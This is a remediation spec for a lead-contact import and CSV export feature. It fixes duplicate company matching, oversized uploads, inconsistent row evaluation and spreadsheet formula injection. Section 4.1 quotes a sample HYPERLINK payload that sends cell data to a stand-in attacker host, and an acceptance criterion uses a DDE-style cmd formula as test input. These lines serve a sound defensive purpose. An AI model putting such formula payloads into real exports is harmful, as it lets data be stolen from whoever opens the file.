# Remediation 06 — Import & Export Robustness

**Date:** 2026-08-27
**Status:** Draft
**Findings closed:** H4, H5 (high), M9 (medium)
**Depends on:** spec 01 §3 (contact email becomes NULL rather than `""`, which this path writes)

---

## Objective

Make the lead contact import survive the data operators actually feed it, and make the CSV
exports safe to open. Both features move personal data across the platform boundary, so both
deserve more care than they currently get.

The import path has three distinct problems: it crashes on duplicate company names, it buffers
an unbounded upload before checking its size, and it evaluates every row twice with results
that can disagree. The export path writes attacker-influenced text into a format that executes
it.

---

## 1. Survive duplicate company names (H4)

### 1.1 Current state

```python
# backend/app/services/lead_contact_import.py:95-98
result = await db.execute(
    select(Company).where(Company.name.ilike(company_name.strip()))
)
company = result.scalar_one_or_none()
```

`scalar_one_or_none()` raises `MultipleResultsFound` when more than one row matches — which is
routine here, not exotic. The award pipeline creates `provisional:<award-id>` companies
(`awards.py:166`) alongside canonical ones carrying the same supplier name, and the historical
contacts sync creates `historical:<digest>` companies on the same names again
(`historical_contacts.py:38-42`).

The exception is not handled. `apply_contact_import` catches `Exception` only to roll back and
re-raise (`leads.py:215-217`), so the operator gets an opaque HTTP 500 partway through an
import with no indication of which row caused it.

Two secondary defects in the same three lines:

- `ilike` without escaping treats `%` and `_` in a company name as wildcards. A supplier
  literally named `A_B Trading` matches `AxB Trading`.
- Matching on raw name only. Spec 01 §4 introduces `normalise_company_name`; this path should
  use it so the import agrees with the enrichment matcher about what "the same company" means.

### 1.2 Change — resolve deterministically, report ambiguity as a row outcome

```python
# backend/app/services/lead_contact_import.py

from sqlalchemy import func
from app.services.text_utils import normalise_company_name


async def _find_company_and_opportunity(
    company_name: str, db: AsyncSession
) -> tuple[Company | None, Opportunity | None, str | None]:
    """Resolve a company by name.

    Returns (company, opportunity, error). `error` is set when the name is
    ambiguous, so the caller can skip the row with a useful message instead
    of raising.
    """
    target = normalise_company_name(company_name)
    if not target:
        return None, None, "Blank company name"

    # Exact match first — cheap, indexed, and unambiguous when it hits.
    exact = (await db.execute(
        select(Company).where(func.lower(Company.name) == company_name.strip().lower())
    )).scalars().all()

    candidates = exact or [
        c for c in (await db.execute(select(Company))).scalars()
        if normalise_company_name(c.name) == target
    ]

    if not candidates:
        return None, None, None                       # caller reports "Unknown company"
    if len(candidates) > 1:
        real = [c for c in candidates if not c.api_id.startswith(("provisional:", "historical:"))]
        if len(real) != 1:
            return None, None, (
                f"{len(candidates)} companies match {company_name!r} — "
                "import by lead_id instead"
            )
        candidates = real                             # a single canonical row wins over stubs

    company = candidates[0]
    opportunity = (await db.execute(
        select(Opportunity)
        .where(Opportunity.company_id == company.id)
        .order_by(Opportunity.created_at.desc())
        .limit(1)
    )).scalars().first()
    return company, opportunity, None
```

> **Note on the normalised fallback.** Loading every company to normalise in Python is
> acceptable at current volume and is how spec 01 §4 already works, but it does not scale.
> Both paths should eventually share a stored `Company.normalised_name` column with an index.
> Tracked in §5.

`_decide` then turns the ambiguity into a normal skip:

```python
elif company_name:
    company, opportunity, error = await _find_company_and_opportunity(company_name, db)
    if error:
        return ImportDecision(row, "skip", error)
    if not company:
        return ImportDecision(row, "skip", f"Unknown company: {company_name}")
    company_id = company.id
```

The preview table already renders `message` per row, so the operator sees exactly which rows
were ambiguous and why, before applying anything.

### 1.3 Change — order by created_at

The current opportunity lookup uses `.limit(1)` with no `ORDER BY`, so which opportunity an
imported contact is associated with is whatever the database returns first. The version above
adds `ORDER BY created_at DESC`, matching the convention already used in `watchlist.py:30`.

---

## 2. Check upload size before buffering (H5)

### 2.1 Current state

```python
# backend/app/api/leads.py:179-190
async def _parse_contact_import(file: UploadFile) -> list:
    if not file.filename:
        raise HTTPException(status_code=400, detail="Choose a CSV or XLSX file to import")
    content = await file.read()                      # <- whole file into RAM
    if not content:
        raise HTTPException(status_code=400, detail="The import file is empty")
    if len(content) > MAX_IMPORT_BYTES:              # <- checked after
        raise HTTPException(status_code=400, detail="Import files must be 10 MB or smaller")
```

A multi-gigabyte upload on this authenticated endpoint is fully materialised in the worker
process before being rejected. With `uvicorn` running a small number of workers, a handful of
concurrent uploads is enough to exhaust memory.

### 2.2 Change — reject on the declared size, then read with a hard ceiling

```python
async def _read_bounded(file: UploadFile, limit: int) -> bytes:
    """Read at most `limit` bytes, refusing anything larger.

    Checks the declared size first (Starlette populates it from the multipart
    headers) and still enforces the ceiling while reading, because the declared
    size is client-supplied and may lie.
    """
    if file.size is not None and file.size > limit:
        raise HTTPException(
            status_code=413,
            detail=f"Import files must be {limit // (1024 * 1024)} MB or smaller",
        )
    chunks: list[bytes] = []
    total = 0
    while chunk := await file.read(64 * 1024):
        total += len(chunk)
        if total > limit:
            raise HTTPException(
                status_code=413,
                detail=f"Import files must be {limit // (1024 * 1024)} MB or smaller",
            )
        chunks.append(chunk)
    return b"".join(chunks)
```

`_parse_contact_import` uses it, and the status code moves from 400 to 413, which is what the
condition means.

### 2.3 Change — bound the parsed row count too

A 10 MB CSV can hold roughly 100,000 rows, and §3 currently evaluates each one with two
database queries. Cap it:

```python
MAX_IMPORT_ROWS = 10_000

if len(rows) > MAX_IMPORT_ROWS:
    raise ValueError(
        f"That file has {len(rows):,} rows. Split it into files of "
        f"{MAX_IMPORT_ROWS:,} rows or fewer."
    )
```

Also guard the CSV field-size limit, which `csv` enforces with a bare `_csv.Error` that would
surface as a 500:

```python
try:
    reader = csv.DictReader(StringIO(content.decode("utf-8-sig")))
    rows = [...]
except UnicodeDecodeError as exc:
    raise ValueError("CSV files must be UTF-8 encoded") from exc
except csv.Error as exc:
    raise ValueError(f"The CSV file could not be read: {exc}") from exc
```

---

## 3. Evaluate each row once (import consistency)

### 3.1 Current state

```python
# backend/app/services/lead_contact_import.py:270-276
async def apply_import(rows: list[ImportRow], db: AsyncSession) -> dict[str, object]:
    preview = await preview_import(rows, db)          # runs _decide on every row
    ...
    for row in rows:
        decision = await _decide(row, db)             # runs _decide on every row again
```

Two problems.

**Cost.** `_decide` issues two to three queries per row, so a 5,000-row import performs
roughly 20,000–30,000 queries where 10,000–15,000 would do.

**Consistency.** SQLAlchemy autoflush is on, so contacts added during the loop are flushed
before the next row's `SELECT`. The second `_decide` pass therefore sees rows the first pass
did not, and the returned `preview` counts can disagree with `applied`. The operator is shown
"12 creates" and told "10 applied" with no explanation.

### 3.2 Change — decide once, reuse

```python
async def _decide_all(rows: list[ImportRow], db: AsyncSession) -> list[ImportDecision]:
    _validate_columns(rows)
    return [await _decide(row, db) for row in rows]


def _summarise(decisions: list[ImportDecision]) -> dict[str, object]:
    return {
        "total_rows": len(decisions),
        "creates": sum(d.action == "create" for d in decisions),
        "updates": sum(d.action == "update" for d in decisions),
        "skips": sum(d.action == "skip" for d in decisions),
        "rows": [_result(d) for d in decisions],
    }


async def preview_import(rows, db) -> dict[str, object]:
    return _summarise(await _decide_all(rows, db))


async def apply_import(rows, db) -> dict[str, object]:
    decisions = await _decide_all(rows, db)
    summary = _summarise(decisions)
    applied = 0
    for decision in decisions:
        if decision.action == "skip":
            continue
        ...
        applied += 1
    ...
    return {**summary, "applied": applied}
```

### 3.3 Change — deduplicate within the file

Deciding once removes the accidental within-file dedupe that autoflush was providing. A file
containing the same email twice for the same company would now create two contacts and hit
the partial unique index from spec 01 §3.3.

Track keys as decisions are made:

```python
seen: set[tuple[str, str]] = set()      # (company_id, email or phone or name)
...
key = (company_id, email or _normalise_phone(phone) or _normalise(name))
if key in seen:
    return ImportDecision(row, "skip", "Duplicate of an earlier row in this file")
seen.add(key)
```

### 3.4 Change — wrap apply in one transaction

`apply_contact_import` already rolls back on exception (`leads.py:215-217`), but `_decide` runs
against the same session and autoflush makes partial state visible. Set
`db.no_autoflush` around the decision pass so decisions are made against the committed state
only, and let the single `commit()` at the end of `apply_import` be the only durability point.

---

## 4. Neutralise formula injection in CSV exports (M9)

### 4.1 Current state

Two endpoints write externally sourced text into CSV with no escaping:

```python
# backend/app/api/leads.py:150-171
writer.writerow([lead.id, lead.company_name, ..., lead.source_tender_title, ...])

# backend/app/api/awards.py:143-145
writer.writerow([item.supplier_name, item.buyer_org_name, item.tender_title, ...])
```

`supplier_name`, `tender_title`, `buyer_org_name`, and contact fields all originate in the
Tenders-SA database or an operator import. A cell whose value begins with `=`, `+`, `-`, `@`,
or a leading tab or carriage return is interpreted as a formula by Excel, LibreOffice, and
Google Sheets. `=HYPERLINK("http://attacker/?d="&A1,"Click")` in a supplier name exfiltrates
the row when the client opens the export that Oricred sent them.

The lead export is the one the client receives, which makes this an outbound risk, not just an
internal one.

### 4.2 Change

```python
# backend/app/services/text_utils.py

CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: object) -> object:
    """Neutralise spreadsheet formula injection.

    A cell beginning with one of the formula trigger characters is prefixed with
    a single quote, which spreadsheet applications strip on display and treat as
    a literal text marker.
    """
    if not isinstance(value, str) or not value:
        return value
    return "'" + value if value.startswith(CSV_FORMULA_PREFIXES) else value
```

Applied at the single point where rows are written, so no future column can forget it:

```python
def write_row(writer, values: list[object]) -> None:
    writer.writerow([csv_safe(v) for v in values])
```

Both `export_leads` and `export_awards` use `write_row`. Numeric and date values pass through
untouched.

### 4.3 Change — set the response encoding

Both endpoints return `media_type="text/csv"` with no charset, and `export_awards` builds its
`StringIO` without `newline=""` (`awards.py:140`), unlike `export_leads` (`leads.py:128`),
which produces stray blank lines on some readers. Fix both:

```python
stream = io.StringIO(newline="")
...
return StreamingResponse(
    iter([stream.getvalue()]),
    media_type="text/csv; charset=utf-8",
    headers={"Content-Disposition": 'attachment; filename="oricred-awards.csv"'},
)
```

Write a UTF-8 BOM (`﻿`) at the start of the stream so Excel on Windows renders South
African place names and supplier names with diacritics correctly.

### 4.4 Note on scope

This change makes the export safe to open. It does not sanitise the data itself — the
apostrophe is visible in the cell if the user inspects the formula bar. That is the correct
trade-off: the alternative, stripping the leading character, silently corrupts legitimate
values such as a supplier named `-Aone Trading`.

---

## 5. Files to change

| File | Change |
|------|--------|
| `backend/app/services/lead_contact_import.py` | §1.2 ambiguity handling; §1.3 ordering; §2.3 row cap and `csv.Error`; §3.2 single decision pass; §3.3 within-file dedupe; §3.4 `no_autoflush` |
| `backend/app/api/leads.py` | §2.2 `_read_bounded`; §4.2 `write_row`; §4.3 response headers |
| `backend/app/api/awards.py` | §4.2 `write_row`; §4.3 response headers and `newline=""` |
| `backend/app/services/text_utils.py` | §4.2 — `csv_safe`, `CSV_FORMULA_PREFIXES` |
| `frontend/src/components/LeadContactImport.tsx` | Surface 413 distinctly from 400; show per-row skip reasons for ambiguous companies |
| `backend/tests/test_lead_contact_import.py` | §1, §3 |
| `backend/tests/test_csv_export.py` | **new** — §4 |

---

## 6. Acceptance criteria

- [ ] Importing a file whose company name matches two companies skips those rows with a readable message, and does not return 500
- [ ] A name matching one canonical company and one `provisional:` stub resolves to the canonical company
- [ ] A company name containing `%` or `_` matches literally
- [ ] Uploading a file larger than 10 MB returns 413 without buffering the whole body
- [ ] A file with more than 10,000 rows is rejected with a message naming the limit
- [ ] A malformed CSV returns 400 with a readable message, not 500
- [ ] Preview counts and apply counts agree for the same file
- [ ] A file containing the same contact twice creates one contact and reports the second as a duplicate row
- [ ] A supplier named `=cmd|'/c calc'!A1` appears in the lead export as literal text and executes nothing
- [ ] Exports open in Excel with correct characters for names containing diacritics
- [ ] The awards export contains no blank line between rows

---

## 7. Deferred scope

- `Company.normalised_name` as a stored, indexed column shared by this path and spec 01 §4.
  Both currently normalise in Python over the full company table.
- Streaming CSV generation. Both exports build the whole file in memory before responding;
  the row ceiling in spec 04 §4.2 bounds it for now.
- XLSX export. Only CSV is offered today.
- An import audit trail recording who imported which contacts and when. `Contact.source` marks
  them as `lead_import` but not by whom.
- Undo for an applied import.
